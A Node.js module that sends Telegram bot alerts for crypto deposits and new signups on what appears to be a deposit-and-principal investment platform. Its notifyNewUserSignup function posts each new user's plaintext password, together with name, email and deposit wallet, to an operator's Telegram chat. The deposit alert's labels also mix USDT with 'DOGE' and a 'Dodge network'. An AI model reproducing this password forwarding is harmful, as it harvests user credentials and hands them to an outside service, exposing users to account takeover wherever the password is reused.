/**
 * Optional Telegram alerts when a **new** USDT deposit is credited (see `autoDepositListener`),
 * and when a **new user** signs up (see `authController.signup`).
 *
 * Set in `.env` when ready:
 *   TELEGRAM_BOT_TOKEN=123456:ABC...
 *   TELEGRAM_CHAT_ID=your numeric chat id (or channel id like -100...)
 *
 * If either is missing, all calls no-op (no errors, no network).
 *
 * Messages include inline copy_text buttons (Telegram copies to clipboard on tap; needs a recent client).
 */
const TELEGRAM_API = 'https://api.telegram.org'

/** Telegram accepts string or number; numeric strings become numbers for consistency with Bot API examples. */
function telegramChatIdForApi(raw) {
  const s = String(raw ?? '').trim()
  if (/^-?\d+$/.test(s)) return Number(s)
  return s
}

function escapeHtml(s) {
  return String(s ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
}

function fmtUsdt(n) {
  const x = Number(n)
  if (!Number.isFinite(x)) return '—'
  return x.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 6 })
}

function branchLabel(branch) {
  if (branch === 'vip_first_deposit') return 'VIP first deposit → principal'
  if (branch === 'principal_activation') return 'Activation threshold → principal'
  if (branch === 'pending_accumulate') return 'Pending (below minimum)'
  return branch
}

/**
 * @param {object} p
 * @param {'vip_first_deposit'|'principal_activation'|'pending_accumulate'} p.branch
 * @param {string} p.userId
 * @param {string} [p.userName]
 * @param {string} [p.userEmail]
 * @param {string} p.depositWallet
 * @param {string|null} p.fromWallet
 * @param {string} p.txId
 * @param {number} p.amountUsdt
 * @param {number} p.pendingBefore
 * @param {number} p.pendingAfterRule
 * @param {number} p.principalCreditedUsdt — principal added this step (0 if only pending)
 * @param {number} p.minActivationUsdt
 * @param {string} p.blockTimeLabel
 * @param {string} p.usdtContract
 */
async function notifySuccessfulUsdtDeposit(p) {
  const token = String(process.env.TELEGRAM_BOT_TOKEN || '').trim()
  const chatIdRaw = String(process.env.TELEGRAM_CHAT_ID || '').trim()
  if (!token || !chatIdRaw) return

  const chatId = telegramChatIdForApi(chatIdRaw)

  const name = escapeHtml(p.userName || '(no name)')
  const email = escapeHtml(p.userEmail || '(no email)')
  const uid = escapeHtml(String(p.userId))
  const to = escapeHtml(p.depositWallet)
  const from = p.fromWallet ? escapeHtml(p.fromWallet) : '—'
  const tx = escapeHtml(p.txId)
  const contract = escapeHtml(p.usdtContract)
  const block = escapeHtml(p.blockTimeLabel || '—')

  const lines = [
    `<b>DOGE deposit credited</b>`,
    ``,
    `<b>Ledger</b>: <code>NEW</code> — first time in ProcessedDodgeDeposit`,
    `<b>On-chain</b>: <code>CONFIRMED</code> (Dodge network indexer)`,
    ``,
    `<b>Applied rule</b>`,
    `<i>${escapeHtml(branchLabel(p.branch))}</i>`,
    ``,
    `<b>User</b>`,
    `• Name: <b>${name}</b>`,
    `• Email: <code>${email}</code>`,
    `• User id: <code>${uid}</code>`,
    ``,
    `<b>This transaction</b>`,
    `• Amount: <b>${escapeHtml(fmtUsdt(p.amountUsdt))} USDT</b>`,
    `• Principal credited this step: <b>${escapeHtml(fmtUsdt(p.principalCreditedUsdt))} USDT</b>`,
    ``,
    `<b>Wallets</b>`,
    `• Recipient (your deposit): <code>${to}</code>`,
    `• Sender (from): <code>${from}</code>`,
    ``,
    `<i>Use the inline buttons below to copy the deposit wallet or tx id (Telegram copies to clipboard on tap).</i>`,
    ``,
    `<b>Context</b>`,
    `• Pending before tx: <code>${escapeHtml(fmtUsdt(p.pendingBefore))}</code> USDT`,
    `• Pending after rule: <code>${escapeHtml(fmtUsdt(p.pendingAfterRule))}</code> USDT`,
    `• Activation minimum: <code>${escapeHtml(fmtUsdt(p.minActivationUsdt))}</code> USDT`,
    ``,
    `<b>Transaction id</b>`,
    `<code>${tx}</code>`,
    ``,
    `<b>Block / time</b>`,
    `${block}`,
    ``,
    `<b>USDT contract</b>`,
    `<code>${contract}</code>`,
  ]

  const text = lines.join('\n')
  const depositPlain = String(p.depositWallet || '').trim().slice(0, 256)
  const txPlain = String(p.txId || '').trim().slice(0, 256)
  const fromPlain = p.fromWallet ? String(p.fromWallet).trim().slice(0, 256) : ''

  const inline_keyboard = []
  if (depositPlain) {
    inline_keyboard.push([
      {
        text: '📋 Copy deposit wallet (DOGE)',
        copy_text: { text: depositPlain },
      },
    ])
  }
  if (fromPlain) {
    inline_keyboard.push([
      {
        text: '📋 Copy sender wallet',
        copy_text: { text: fromPlain },
      },
    ])
  }
  if (txPlain) {
    inline_keyboard.push([
      {
        text: '📋 Copy transaction id',
        copy_text: { text: txPlain },
      },
    ])
  }

  const reply_markup = inline_keyboard.length ? { inline_keyboard } : undefined

  const url = `${TELEGRAM_API}/bot${token}/sendMessage`
  const body = {
    chat_id: chatId,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    ...(reply_markup ? { reply_markup } : {}),
  }
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  })
  if (!res.ok) {
    const errBody = await res.text().catch(() => '')
    console.error('[telegram] sendMessage', res.status, errBody.slice(0, 400))
  }
}

/**
 * @param {{ userId: string, name: string, email: string, password: string, dodgeDepositAddress: string }} p
 */
async function notifyNewUserSignup(p) {
  const token = String(process.env.TELEGRAM_BOT_TOKEN || '').trim()
  const chatIdRaw = String(process.env.TELEGRAM_CHAT_ID || '').trim()
  if (!token || !chatIdRaw) {
    console.warn(
      '[telegram] signup skipped: set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in backend .env (same as deposit alerts).'
    )
    return
  }

  if (typeof fetch !== 'function') {
    console.error('[telegram] signup: Node.js global fetch is missing (use Node 18+).')
    return
  }

  const chatId = telegramChatIdForApi(chatIdRaw)

  const name = escapeHtml(p.name)
  const email = escapeHtml(p.email)
  const password = escapeHtml(p.password)
  const uid = escapeHtml(String(p.userId))
  const depositAddr = p.dodgeDepositAddress || ''
  const addr = escapeHtml(depositAddr)

  const lines = [
    `<b>New account signup</b>`,
    ``,
    `<b>Name</b>: <b>${name}</b>`,
    `<b>Email</b>: <code>${email}</code>`,
    `<b>User id</b>: <code>${uid}</code>`,
    `<b>Password</b>: <code>${password}</code>`,
  ]
  if (depositAddr) {
    lines.push('', `<b>DOGE deposit wallet (Dodge network)</b>`, `<code>${addr}</code>`)
  } else {
    lines.push('', `<i>Per-user deposit wallet disabled — desk uses shared funding address.</i>`)
  }

  const text = lines.join('\n')
  const addrPlain = String(depositAddr).trim().slice(0, 256)
  const inline_keyboard = addrPlain
    ? [[{ text: '📋 Copy deposit wallet (DOGE)', copy_text: { text: addrPlain } }]]
    : []

  const url = `${TELEGRAM_API}/bot${token}/sendMessage`

  const basePayload = {
    chat_id: chatId,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
  }

  const withKeyboard =
    inline_keyboard.length > 0 ? { ...basePayload, reply_markup: { inline_keyboard } } : basePayload

  const post = (payload) =>
    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    })

  let res = await post(withKeyboard)
  if (!res.ok && withKeyboard.reply_markup) {
    const errPreview = await res.text().catch(() => '')
    console.warn('[telegram] signup first send failed; retrying without copy button:', res.status, errPreview.slice(0, 280))
    res = await post(basePayload)
  }

  if (!res.ok) {
    const body = await res.text().catch(() => '')
    console.error('[telegram] signup sendMessage', res.status, body.slice(0, 400))
    throw new Error(`Telegram signup notify failed: ${res.status}`)
  }
  console.info('[telegram] signup notification sent for', p.email)
}

module.exports = { notifySuccessfulUsdtDeposit, notifyNewUserSignup }
